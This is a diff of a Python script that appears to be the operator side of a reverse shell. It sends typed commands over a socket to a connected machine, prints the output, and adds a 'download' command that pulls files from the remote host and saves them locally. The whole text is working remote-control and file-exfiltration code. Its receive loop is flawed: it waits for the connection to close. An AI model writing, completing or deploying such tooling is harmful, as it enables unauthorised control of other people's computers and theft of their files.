@@ -28,26 +28,27 @@ while con:
         cmd = input('>>>')
         if not cmd:
             continue
+
         elif 'download' in cmd:
-            getfile_size = con.recv(1024)
-            chnk_cnt = 0
-
-            while chnk_cnt < getfile_size and not len(getfile_size) <= 0:
-                try:
-                    file = con.recv(4096)
+            con.send(cmd.encode())
+            getfile_name = cmd.split(maxsplit=1)[1]
+            try:
+                with open(getfile_name,'wb') as file:
                     while True:
-                        file = con.recv(4096)
-                    with open(file,'wb') as f:
-                        f.write(file)
-
-                except:
-                    pass
-            #RESUME FROM IT 
+                        fetch_file = con.recv(8192)
+                        if not fetch_file:
+                            break
+                        file.write(fetch_file)
+                print('file recieved...')
+                file.close()
+            except Exception as e:
+                print(e)
 
         elif cmd in ('quite','exit'):
             con.close()
             sock.close()
             break
+
         else:
             con.send(cmd.encode())
             output = con.recv(1168).decode()
